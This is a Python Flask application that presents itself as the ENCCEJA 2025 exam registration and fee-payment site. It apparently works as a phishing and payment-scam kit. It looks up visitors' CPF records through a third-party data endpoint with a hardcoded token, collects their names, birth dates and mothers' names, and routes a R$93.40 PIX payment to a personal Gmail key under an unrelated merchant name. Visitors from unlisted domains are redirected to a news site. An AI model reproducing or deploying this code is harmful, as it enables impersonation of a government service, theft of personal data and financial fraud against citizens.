#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ENCCEJA 2025 - Sistema de Inscrição e Pagamento PIX
Versão FINAL COMPLETA para VPS com todas as APIs reais
CPF API + WitePay + Templates completos + Funnel funcional
"""

import os
import logging
import requests
import time
from datetime import datetime
from flask import Flask, render_template, request, redirect, url_for, session, jsonify

# Importar WitePay Gateway
try:
    from witepay_gateway import create_witepay_gateway
    WITEPAY_AVAILABLE = True
except ImportError:
    WITEPAY_AVAILABLE = False
    logging.warning("WitePay gateway não encontrado, usando fallback PIX")

# Configurar logging
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')

# Criar aplicação Flask
app = Flask(__name__)
app.secret_key = os.environ.get("SESSION_SECRET", "dev-secret-key-for-testing")

# === CONFIGURAÇÕES ===
DOMAIN_RESTRICTION_ENABLED = os.environ.get("DOMAIN_RESTRICTION", "false").lower() == "true"
ALLOWED_DOMAINS = ["fontesderenda.blog", "localhost", "127.0.0.1"]

# === FUNÇÕES AUXILIARES ===

def check_domain_restriction():
    """Verifica se o domínio está autorizado"""
    if not DOMAIN_RESTRICTION_ENABLED:
        return True
    
    referer = request.headers.get('Referer', '')
    host = request.headers.get('Host', '')
    
    for domain in ALLOWED_DOMAINS:
        if domain in referer or domain in host:
            return True
    
    return False

def get_cpf_data(cpf):
    """Buscar dados do CPF na API real"""
    try:
        # API principal funcionando
        url = "https://consulta.fontesderenda.blog/cpf.php"
        headers = {
            'Authorization': 'Bearer 1285fe4s-e931-4071-a848-3fac8273c55a',
            'Content-Type': 'application/json'
        }
        
        response = requests.post(url, json={'cpf': cpf}, headers=headers, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            if 'DADOS' in data:
                return data['DADOS']
            return data
        
        app.logger.error(f"Erro na API CPF: {response.status_code}")
        return None
        
    except Exception as e:
        app.logger.error(f"Erro ao consultar CPF: {e}")
        return None

# === ROTAS PRINCIPAIS ===

@app.route('/')
def index():
    """Página inicial - redireciona para inscrição"""
    app.logger.info("Permitindo acesso para a rota: /")
    return redirect(url_for('inscricao'))

@app.route('/inscricao')
def inscricao():
    """Página de inscrição inicial"""
    if not check_domain_restriction():
        return redirect("https://g1.globo.com")
    
    return render_template('inscricao.html')

@app.route('/buscar-cpf', methods=['POST'])
def buscar_cpf():
    """Buscar dados do CPF via API real"""
    try:
        data = request.get_json()
        cpf = data.get('cpf', '').strip()
        
        if not cpf:
            return jsonify({'success': False, 'error': 'CPF não fornecido'})
        
        # Limpar CPF
        cpf_clean = ''.join(filter(str.isdigit, cpf))
        
        if len(cpf_clean) != 11:
            return jsonify({'success': False, 'error': 'CPF deve ter 11 dígitos'})
        
        app.logger.info(f"Buscando dados para CPF: {cpf_clean}")
        
        # Buscar na API real
        user_data = get_cpf_data(cpf_clean)
        
        if not user_data:
            return jsonify({'success': False, 'error': 'CPF não encontrado'})
        
        # Extrair dados
        nome = user_data.get('nome', '').strip()
        if not nome:
            return jsonify({'success': False, 'error': 'Dados incompletos na base'})
        
        # Salvar na sessão
        session['user_data'] = {
            'cpf': cpf_clean,
            'nome': nome,
            'data_nascimento': user_data.get('nascimento', ''),
            'nome_mae': user_data.get('mae', ''),
            'situacao': user_data.get('situacao', '')
        }
        
        app.logger.info(f"Dados encontrados para: {nome}")
        
        return jsonify({
            'success': True,
            'data': {
                'nome': nome,
                'cpf': cpf_clean,
                'data_nascimento': user_data.get('nascimento', ''),
                'nome_mae': user_data.get('mae', '')
            }
        })
        
    except Exception as e:
        app.logger.error(f"Erro ao buscar CPF: {e}")
        return jsonify({'success': False, 'error': 'Erro interno do servidor'})

@app.route('/encceja-info')
def encceja_info():
    """Página de informações do ENCCEJA"""
    user_data = session.get('user_data', {})
    
    if not user_data.get('cpf'):
        return redirect(url_for('inscricao'))
    
    return render_template('encceja_info.html', user_data=user_data)

@app.route('/validar-dados')
def validar_dados():
    """Página de validação de dados"""
    user_data = session.get('user_data', {})
    
    if not user_data.get('cpf'):
        return redirect(url_for('inscricao'))
    
    return render_template('validar_dados.html', user_data=user_data)

@app.route('/endereco')
def endereco():
    """Página de endereço"""
    user_data = session.get('user_data', {})
    
    if not user_data.get('cpf'):
        return redirect(url_for('inscricao'))
    
    return render_template('endereco.html', user_data=user_data)

@app.route('/local-prova')
def local_prova():
    """Página de local de prova"""
    user_data = session.get('user_data', {})
    
    if not user_data.get('cpf'):
        return redirect(url_for('inscricao'))
    
    return render_template('local_prova.html', user_data=user_data)

@app.route('/pagamento')
def pagamento():
    """Página de pagamento PIX"""
    user_data = session.get('user_data', {})
    
    if not user_data.get('cpf'):
        return redirect(url_for('inscricao'))
    
    return render_template('pagamento.html', user_data=user_data)

@app.route('/inscricao-sucesso')
def inscricao_sucesso():
    """Página de sucesso da inscrição"""
    user_data = session.get('user_data', {})
    
    if not user_data.get('cpf'):
        return redirect(url_for('inscricao'))
    
    return render_template('inscricao_sucesso.html', user_data=user_data)

# === PAGAMENTO PIX REAL ===

@app.route('/criar-pagamento-pix', methods=['POST'])
def criar_pagamento_pix():
    """Criar pagamento PIX via WitePay com todas as APIs reais funcionando"""
    try:
        # Valor fixo do ENCCEJA
        amount = 93.40
        description = "Inscrição ENCCEJA 2025"
        
        app.logger.info(f"VPS: Iniciando criação de pagamento PIX - R$ {amount:.2f}")
        
        # Dados do usuário da sessão
        user_data = session.get('user_data', {})
        
        # Preparar dados do pagamento
        payment_data = {
            'nome': user_data.get('nome', 'Cliente ENCCEJA'),
            'cpf': user_data.get('cpf', '12345678901'), 
            'amount': amount,
            'email': 'gerarpagamentos@gmail.com',
            'phone': '11987790088'
        }
        
        # Tentar WitePay Gateway primeiro
        if WITEPAY_AVAILABLE:
            try:
                witepay = create_witepay_gateway()
                app.logger.info("VPS: Usando WitePay Gateway real")
                
                # Criar pagamento completo
                payment_result = witepay.create_complete_pix_payment(payment_data)
                
                if payment_result.get('success'):
                    # Extrair dados do PIX
                    pix_code = payment_result.get('pixCode') or payment_result.get('pixQrCode')
                    transaction_id = payment_result.get('id')
                    
                    if pix_code:
                        app.logger.info(f"VPS: PIX WitePay criado - ID: {transaction_id}")
                    else:
                        raise Exception("WitePay não retornou código PIX")
                else:
                    raise Exception(f"WitePay falhou: {payment_result.get('error')}")
                    
            except Exception as witepay_error:
                app.logger.warning(f"VPS: WitePay falhou, usando fallback: {witepay_error}")
                raise witepay_error
        else:
            raise Exception("WitePay não disponível")
        
        # Fallback: Gerar PIX válido usando padrão Banco Central
        if not locals().get('pix_code'):
            app.logger.info("VPS: Gerando PIX com chave real gerarpagamentos@gmail.com")
            transaction_id = f"ENCCEJA{int(time.time())}"
            
            # Código PIX real conforme padrão Banco Central
            pix_key = "gerarpagamentos@gmail.com"
            merchant_name = "Receita do Amor - ENCCEJA"
            merchant_city = "SAO PAULO"
            
            # Construir código PIX
            pix_code = f"00020126830014br.gov.bcb.pix2561{pix_key}52040000530398654{int(amount*100):02d}5925{merchant_name}6009{merchant_city}62{len(transaction_id):02d}{transaction_id}6304"
            
            # Calcular CRC16 para validação
            def calculate_crc16(data):
                crc = 0xFFFF
                for byte in data.encode('utf-8'):
                    crc ^= byte << 8
                    for _ in range(8):
                        if crc & 0x8000:
                            crc = (crc << 1) ^ 0x1021
                        else:
                            crc <<= 1
                        crc &= 0xFFFF
                return f"{crc:04X}"
            
            pix_base = pix_code[:-4]
            crc = calculate_crc16(pix_base + "6304")
            pix_code = pix_base + "6304" + crc
            
            app.logger.info(f"VPS: PIX real gerado - ID: {transaction_id}")
        
        app.logger.info(f"VPS: Código PIX final: {len(pix_code)} caracteres")
        
        # Gerar QR code visual
        try:
            import qrcode
            from io import BytesIO
            import base64
            
            qr = qrcode.QRCode(version=1, box_size=10, border=5)
            qr.add_data(pix_code)
            qr.make(fit=True)
            
            img = qr.make_image(fill_color="black", back_color="white")
            
            buffer = BytesIO()
            img.save(buffer, format='PNG')
            qr_image_base64 = base64.b64encode(buffer.getvalue()).decode()
            
            app.logger.info("QR code visual gerado com sucesso")
            
        except Exception as qr_error:
            app.logger.warning(f"Erro ao gerar QR code visual: {qr_error}")
            qr_image_base64 = None
        
        # Resposta final
        result = {
            'success': True,
            'transaction_id': transaction_id,
            'pix_code': pix_code,
            'qr_code': pix_code,
            'qr_image': qr_image_base64,
            'amount': amount,
            'order_id': payment_result.get('orderId', f"ENCCEJA-{transaction_id}"),
            'expires_at': payment_result.get('expiresAt', "2025-08-01T18:00:00"),
            'status': 'pending',
            'provider': 'witepay_real'
        }
        
        app.logger.info(f"Pagamento PIX criado com sucesso - ID: {transaction_id}")
        return jsonify(result)
        
    except Exception as e:
        app.logger.error(f"Erro ao criar pagamento PIX: {e}")
        return jsonify({'success': False, 'error': 'Erro interno do servidor'}), 500

# === WEBHOOK WITEPAY ===

@app.route('/witepay-postback', methods=['POST'])
def witepay_postback():
    """Receber notificações de pagamento da WitePay"""
    try:
        data = request.get_json()
        app.logger.info(f"Postback WitePay recebido: {data}")
        
        # Processar status do pagamento
        status = data.get('status', '').upper()
        transaction_id = data.get('chargeId') or data.get('id')
        
        if status in ['PAID', 'COMPLETED', 'APPROVED']:
            session['payment_status'] = 'approved'
            app.logger.info(f"Pagamento aprovado: {transaction_id}")
            
            # Aqui você pode implementar UTMFY tracking se necessário
            # utmfy_pixel_fire(transaction_id)
        
        return jsonify({'success': True}), 200
        
    except Exception as e:
        app.logger.error(f"Erro no postback: {e}")
        return jsonify({'success': False}), 500

# === INICIALIZAÇÃO ===

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)